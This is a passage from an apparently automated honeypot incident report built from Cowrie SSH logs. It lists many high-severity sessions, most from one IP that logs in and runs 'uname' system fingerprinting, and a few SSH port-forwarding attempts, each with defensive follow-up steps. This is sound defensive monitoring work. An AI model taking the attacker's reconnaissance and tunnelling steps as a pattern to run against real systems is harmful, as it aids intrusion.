| `2026-07-28 05:06:26` | `cowrie.login.success` |
| `2026-07-28 05:06:27` | `cowrie.session.params` |
| `2026-07-28 05:06:27` | `cowrie.command.input` |
| `2026-07-28 05:06:27` | `cowrie.log.closed` |
| `2026-07-28 05:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d318bd439a30

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:31` | `cowrie.session.connect` |
| `2026-07-28 05:06:31` | `cowrie.client.version` |
| `2026-07-28 05:06:31` | `cowrie.client.kex` |
| `2026-07-28 05:06:32` | `cowrie.login.success` |
| `2026-07-28 05:06:32` | `cowrie.session.params` |
| `2026-07-28 05:06:32` | `cowrie.command.input` |
| `2026-07-28 05:06:33` | `cowrie.log.closed` |
| `2026-07-28 05:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c22f28419f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:37` | `cowrie.session.connect` |
| `2026-07-28 05:06:37` | `cowrie.client.version` |
| `2026-07-28 05:06:37` | `cowrie.client.kex` |
| `2026-07-28 05:06:38` | `cowrie.login.success` |
| `2026-07-28 05:06:38` | `cowrie.session.params` |
| `2026-07-28 05:06:38` | `cowrie.command.input` |
| `2026-07-28 05:06:39` | `cowrie.log.closed` |
| `2026-07-28 05:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6fa5bd8a080

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:40` | `cowrie.session.connect` |
| `2026-07-28 05:06:40` | `cowrie.client.version` |
| `2026-07-28 05:06:40` | `cowrie.client.kex` |
| `2026-07-28 05:06:41` | `cowrie.login.success` |
| `2026-07-28 05:06:41` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:06:41` | `cowrie.direct-tcpip.data` |
| `2026-07-28 05:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e396078be9b

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:41` | `cowrie.session.connect` |
| `2026-07-28 05:06:42` | `cowrie.client.version` |
| `2026-07-28 05:06:42` | `cowrie.client.kex` |
| `2026-07-28 05:06:46` | `cowrie.login.success` |
| `2026-07-28 05:06:47` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b56adcd13d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:43` | `cowrie.session.connect` |
| `2026-07-28 05:06:43` | `cowrie.client.version` |
| `2026-07-28 05:06:43` | `cowrie.client.kex` |
| `2026-07-28 05:06:44` | `cowrie.login.success` |
| `2026-07-28 05:06:45` | `cowrie.session.params` |
| `2026-07-28 05:06:45` | `cowrie.command.input` |
| `2026-07-28 05:06:45` | `cowrie.log.closed` |
| `2026-07-28 05:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a935d5b2f415

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:49` | `cowrie.session.connect` |
| `2026-07-28 05:06:49` | `cowrie.client.version` |
| `2026-07-28 05:06:49` | `cowrie.client.kex` |
| `2026-07-28 05:06:51` | `cowrie.login.success` |
| `2026-07-28 05:06:53` | `cowrie.session.params` |
| `2026-07-28 05:06:53` | `cowrie.command.input` |
| `2026-07-28 05:06:53` | `cowrie.log.closed` |
| `2026-07-28 05:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62dd90b2b069

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:06 |
| **Last Seen** | 2026-07-28 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:06:56` | `cowrie.session.connect` |
| `2026-07-28 05:06:56` | `cowrie.client.version` |
| `2026-07-28 05:06:56` | `cowrie.client.kex` |
| `2026-07-28 05:06:57` | `cowrie.login.success` |
| `2026-07-28 05:06:58` | `cowrie.session.params` |
| `2026-07-28 05:06:58` | `cowrie.command.input` |
| `2026-07-28 05:06:59` | `cowrie.log.closed` |
| `2026-07-28 05:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5df913d4d41d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:02` | `cowrie.session.connect` |
| `2026-07-28 05:07:02` | `cowrie.client.version` |
| `2026-07-28 05:07:02` | `cowrie.client.kex` |
| `2026-07-28 05:07:04` | `cowrie.login.success` |
| `2026-07-28 05:07:05` | `cowrie.session.params` |
| `2026-07-28 05:07:05` | `cowrie.command.input` |
| `2026-07-28 05:07:05` | `cowrie.log.closed` |
| `2026-07-28 05:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec65f67ca80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:08` | `cowrie.session.connect` |
| `2026-07-28 05:07:08` | `cowrie.client.version` |
| `2026-07-28 05:07:08` | `cowrie.client.kex` |
| `2026-07-28 05:07:09` | `cowrie.login.success` |
| `2026-07-28 05:07:10` | `cowrie.session.params` |
| `2026-07-28 05:07:10` | `cowrie.command.input` |
| `2026-07-28 05:07:11` | `cowrie.log.closed` |
| `2026-07-28 05:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903968fbecce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:13` | `cowrie.session.connect` |
| `2026-07-28 05:07:14` | `cowrie.client.version` |
| `2026-07-28 05:07:14` | `cowrie.client.kex` |
| `2026-07-28 05:07:16` | `cowrie.login.success` |
| `2026-07-28 05:07:18` | `cowrie.session.params` |
| `2026-07-28 05:07:18` | `cowrie.command.input` |
| `2026-07-28 05:07:19` | `cowrie.log.closed` |
| `2026-07-28 05:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3215de28a18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:19` | `cowrie.session.connect` |
| `2026-07-28 05:07:20` | `cowrie.client.version` |
| `2026-07-28 05:07:20` | `cowrie.client.kex` |
| `2026-07-28 05:07:23` | `cowrie.login.success` |
| `2026-07-28 05:07:26` | `cowrie.session.params` |
| `2026-07-28 05:07:26` | `cowrie.command.input` |
| `2026-07-28 05:07:26` | `cowrie.log.closed` |
| `2026-07-28 05:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6bd3f6a604

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:26` | `cowrie.session.connect` |
| `2026-07-28 05:07:26` | `cowrie.client.version` |
| `2026-07-28 05:07:26` | `cowrie.client.kex` |
| `2026-07-28 05:07:30` | `cowrie.login.success` |
| `2026-07-28 05:07:32` | `cowrie.session.params` |
| `2026-07-28 05:07:32` | `cowrie.command.input` |
| `2026-07-28 05:07:32` | `cowrie.log.closed` |
| `2026-07-28 05:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433fb0890de8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:32` | `cowrie.session.connect` |
| `2026-07-28 05:07:32` | `cowrie.client.version` |
| `2026-07-28 05:07:32` | `cowrie.client.kex` |
| `2026-07-28 05:07:35` | `cowrie.login.success` |
| `2026-07-28 05:07:37` | `cowrie.session.params` |
| `2026-07-28 05:07:37` | `cowrie.command.input` |
| `2026-07-28 05:07:37` | `cowrie.log.closed` |
| `2026-07-28 05:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edb8220a96c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:37` | `cowrie.session.connect` |
| `2026-07-28 05:07:38` | `cowrie.client.version` |
| `2026-07-28 05:07:38` | `cowrie.client.kex` |
| `2026-07-28 05:07:41` | `cowrie.login.success` |
| `2026-07-28 05:07:42` | `cowrie.session.params` |
| `2026-07-28 05:07:42` | `cowrie.command.input` |
| `2026-07-28 05:07:42` | `cowrie.log.closed` |
| `2026-07-28 05:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9b5281755e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:44` | `cowrie.session.connect` |
| `2026-07-28 05:07:44` | `cowrie.client.version` |
| `2026-07-28 05:07:44` | `cowrie.client.kex` |
| `2026-07-28 05:07:46` | `cowrie.login.success` |
| `2026-07-28 05:07:48` | `cowrie.session.params` |
| `2026-07-28 05:07:48` | `cowrie.command.input` |
| `2026-07-28 05:07:49` | `cowrie.log.closed` |
| `2026-07-28 05:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-339213fc778a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:49` | `cowrie.session.connect` |
| `2026-07-28 05:07:50` | `cowrie.client.version` |
| `2026-07-28 05:07:50` | `cowrie.client.kex` |
| `2026-07-28 05:07:54` | `cowrie.login.success` |
| `2026-07-28 05:07:58` | `cowrie.session.params` |
| `2026-07-28 05:07:58` | `cowrie.command.input` |
| `2026-07-28 05:07:59` | `cowrie.log.closed` |
| `2026-07-28 05:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e25390a2f2b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:07 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:07:54` | `cowrie.session.connect` |
| `2026-07-28 05:07:55` | `cowrie.client.version` |
| `2026-07-28 05:07:55` | `cowrie.client.kex` |
| `2026-07-28 05:08:00` | `cowrie.login.success` |
| `2026-07-28 05:08:02` | `cowrie.session.params` |
| `2026-07-28 05:08:02` | `cowrie.command.input` |
| `2026-07-28 05:08:04` | `cowrie.log.closed` |
| `2026-07-28 05:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae8ce6d9e9cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:01` | `cowrie.session.connect` |
| `2026-07-28 05:08:02` | `cowrie.client.version` |
| `2026-07-28 05:08:02` | `cowrie.client.kex` |
| `2026-07-28 05:08:06` | `cowrie.login.success` |
| `2026-07-28 05:08:07` | `cowrie.session.params` |
| `2026-07-28 05:08:07` | `cowrie.command.input` |
| `2026-07-28 05:08:08` | `cowrie.log.closed` |
| `2026-07-28 05:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f7dac025d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:07` | `cowrie.session.connect` |
| `2026-07-28 05:08:08` | `cowrie.client.version` |
| `2026-07-28 05:08:08` | `cowrie.client.kex` |
| `2026-07-28 05:08:11` | `cowrie.login.success` |
| `2026-07-28 05:08:12` | `cowrie.session.params` |
| `2026-07-28 05:08:12` | `cowrie.command.input` |
| `2026-07-28 05:08:13` | `cowrie.log.closed` |
| `2026-07-28 05:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b5473aa851

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:15` | `cowrie.session.connect` |
| `2026-07-28 05:08:15` | `cowrie.client.version` |
| `2026-07-28 05:08:15` | `cowrie.client.kex` |
| `2026-07-28 05:08:15` | `cowrie.login.success` |
| `2026-07-28 05:08:16` | `cowrie.session.params` |
| `2026-07-28 05:08:16` | `cowrie.command.input` |
| `2026-07-28 05:08:16` | `cowrie.log.closed` |
| `2026-07-28 05:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd16249e4211

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:20` | `cowrie.session.connect` |
| `2026-07-28 05:08:20` | `cowrie.client.version` |
| `2026-07-28 05:08:21` | `cowrie.client.kex` |
| `2026-07-28 05:08:21` | `cowrie.login.success` |
| `2026-07-28 05:08:22` | `cowrie.session.params` |
| `2026-07-28 05:08:22` | `cowrie.command.input` |
| `2026-07-28 05:08:22` | `cowrie.log.closed` |
| `2026-07-28 05:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68fdf890884b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:26` | `cowrie.session.connect` |
| `2026-07-28 05:08:27` | `cowrie.client.version` |
| `2026-07-28 05:08:27` | `cowrie.client.kex` |
| `2026-07-28 05:08:27` | `cowrie.login.success` |
| `2026-07-28 05:08:29` | `cowrie.session.params` |
| `2026-07-28 05:08:29` | `cowrie.command.input` |
| `2026-07-28 05:08:29` | `cowrie.log.closed` |
| `2026-07-28 05:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7100d1a7833

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:32` | `cowrie.session.connect` |
| `2026-07-28 05:08:32` | `cowrie.client.version` |
| `2026-07-28 05:08:32` | `cowrie.client.kex` |
| `2026-07-28 05:08:33` | `cowrie.login.success` |
| `2026-07-28 05:08:34` | `cowrie.session.params` |
| `2026-07-28 05:08:34` | `cowrie.command.input` |
| `2026-07-28 05:08:35` | `cowrie.log.closed` |
| `2026-07-28 05:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea514896fc22

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:37` | `cowrie.session.connect` |
| `2026-07-28 05:08:38` | `cowrie.client.version` |
| `2026-07-28 05:08:38` | `cowrie.client.kex` |
| `2026-07-28 05:08:39` | `cowrie.login.success` |
| `2026-07-28 05:08:40` | `cowrie.session.params` |
| `2026-07-28 05:08:40` | `cowrie.command.input` |
| `2026-07-28 05:08:40` | `cowrie.log.closed` |
| `2026-07-28 05:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941d8c43421f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:44` | `cowrie.session.connect` |
| `2026-07-28 05:08:44` | `cowrie.client.version` |
| `2026-07-28 05:08:44` | `cowrie.client.kex` |
| `2026-07-28 05:08:45` | `cowrie.login.success` |
| `2026-07-28 05:08:46` | `cowrie.session.params` |
| `2026-07-28 05:08:46` | `cowrie.command.input` |
| `2026-07-28 05:08:46` | `cowrie.log.closed` |
| `2026-07-28 05:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f58d869d78

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
